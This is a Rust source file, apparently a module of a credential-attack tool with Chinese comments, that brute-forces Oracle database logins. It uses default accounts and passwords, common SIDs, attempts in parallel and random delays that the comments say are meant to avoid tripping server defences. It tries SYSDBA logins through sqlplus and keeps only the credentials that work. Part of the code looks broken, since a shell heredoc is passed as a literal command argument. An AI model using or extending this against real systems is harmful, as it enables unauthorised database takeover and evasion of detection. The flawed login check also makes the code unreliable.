use crate::handler::brute::{BruteForceResult, BruteForceTask, Protocol, TaskStatus, BruteForceManager};
use std::sync::Arc;
use tokio::sync::{Mutex, Semaphore};
use std::time::{Duration, Instant};
use futures::future::join_all;
use rand::Rng;
use std::process::Command;

// Oracle暴力破解功能
pub async fn oracle_brute_force(
    task: BruteForceTask,
    manager_state: Arc<Mutex<BruteForceManager>>
) -> Vec<BruteForceResult> {
    let target = task.target.clone();
    let port = if task.port == 0 { 1521 } else { task.port }; // 默认Oracle端口1521
    let task_id = task.id.unwrap_or(0);
    let num_threads = task.threads.max(1) as usize;
    
    // 获取用户名和密码列表
    let usernames = match (task.usernames.clone(), task.username_file.clone()) {
        (Some(names), _) if !names.is_empty() => names,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["system".to_string(), "sys".to_string(), "dbsnmp".to_string(), "scott".to_string()],
    };

    let passwords = match (task.passwords.clone(), task.password_file.clone()) {
        (Some(pwds), _) if !pwds.is_empty() => pwds,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["oracle".to_string(), "manager".to_string(), "password".to_string(), "tiger".to_string()],
    };

    if usernames.is_empty() || passwords.is_empty() {
        return Vec::new();
    }

    let semaphore = Arc::new(Semaphore::new(num_threads));
    let mut spawned_tasks = Vec::new();

    // 尝试获取SID列表（如果未提供）
    let sid_list = vec!["orcl".to_string(), "XE".to_string()]; // 默认SID列表
    
    'outer: for username in usernames {
        for password in &passwords {
            for sid in &sid_list {
                // 检查任务是否已从外部停止
                {
                    let guard = manager_state.lock().await;
                    if let Some(current_task_in_manager) = guard.tasks.iter().find(|t| t.id == Some(task_id)) {
                        if current_task_in_manager.status == TaskStatus::Stopped {
                            break 'outer;
                        }
                    } else {
                        break 'outer;
                    }
                }

                let permit = match semaphore.clone().acquire_owned().await {
                    Ok(p) => p,
                    Err(_) => break 'outer,
                };

                let t_target = target.clone();
                let t_port = port;
                let t_username = username.clone();
                let t_password = password.clone();
                let t_sid = sid.clone();
                let t_timeout_secs = task.timeout;
                let t_task_id = task_id;
                let t_protocol_clone = task.protocol.clone();
                
                // 增加随机延迟以避免触发服务器防御机制
                let delay_ms = rand::thread_rng().gen_range(10..100);
                tokio::time::sleep(Duration::from_millis(delay_ms)).await;

                spawned_tasks.push(tokio::spawn(async move {
                    let start_time = Instant::now();
                    
                    // Oracle连接尝试
                    let result = try_oracle_login(t_target.clone(), t_port, t_sid.clone(), t_username.clone(), t_password.clone(), t_timeout_secs).await;
                    let duration = start_time.elapsed().as_millis() as u64;
                    drop(permit);
                    
                    match result {
                        Ok(_) => {
                            // 登录成功
                            Some(BruteForceResult {
                                task_id: t_task_id,
                                target: format!("{}:{}/{}", t_target, t_port, t_sid),
                                protocol: t_protocol_clone,
                                username: t_username,
                                password: t_password,
                                success: true,
                                time_taken: duration,
                                error: None,
                            })
                        },
                        Err(_) => None, // 不返回失败结果
                    }
                }));
            }
        }
    }

    let mut results = Vec::new();
    for task_handle in join_all(spawned_tasks).await {
        match task_handle {
            Ok(Some(result)) => {
                results.push(result);
            }
            Ok(None) => {
                // 登录尝试失败，不做任何操作
            }
            Err(e) => {
                eprintln!("Oracle brute force task panicked: {}", e);
            }
        }
    }

    results
}

// 尝试Oracle登录
// 由于Oracle客户端库较为复杂，这里使用外部命令进行连接测试
async fn try_oracle_login(host: String, port: u16, sid: String, username: String, password: String, timeout_secs: u64) -> Result<(), String> {
    // 使用spawn_blocking执行外部命令，因为它会阻塞线程
    tokio::task::spawn_blocking(move || {
        // 构建连接字符串
        let connect_string_val = format!("{}/{}@{}:{}/{}", username, password, host, port, sid);
        
        let sqlplus_executable = "sqlplus";
        // 将所有参数收集到 Vec<String> 中，确保它们被拥有
        let sqlplus_args: Vec<String> = vec![
            "-L".to_string(),  // 禁止提示
            "-S".to_string(),  // 静默模式
            connect_string_val, // connect_string_val 是 String，所有权在此
            "as".to_string(),
            "sysdba".to_string(),  // 尝试SYSDBA模式
            // 执行一个简单的查询验证连接
            "<<EOF
            SET PAGESIZE 0
            SET FEEDBACK OFF
            SELECT 'Connection_Successful' FROM dual;
            EXIT;
            EOF".to_string()
        ];
        
        // 构建 timeout 命令
        let mut timeout_command = Command::new("timeout");
        timeout_command.arg(format!("{}", timeout_secs));
        timeout_command.arg(sqlplus_executable);
        for arg in &sqlplus_args { // 迭代 Vec<String> 中的引用
            timeout_command.arg(arg); // arg 是 &String，Command::arg 会处理
        }
        
        // 执行命令
        match timeout_command.output() {
            Ok(output) => {
                // 检查命令输出
                if output.status.success() {
                    let output_str = String::from_utf8_lossy(&output.stdout);
                    if output_str.contains("Connection_Successful") {
                        return Ok(());
                    }
                }
                // 如果 status 不成功，或输出不包含成功标志，则认为失败
                let stderr_str = String::from_utf8_lossy(&output.stderr);
                Err(format!("Oracle login failed. Status: {:?}, Stdout: '{}', Stderr: '{}'", output.status, String::from_utf8_lossy(&output.stdout), stderr_str))
            },
            Err(e) => Err(format!("Failed to execute Oracle command with timeout: {}", e)),
        }
    }).await.unwrap_or_else(|e| Err(format!("Oracle task panic: {}", e)))
} 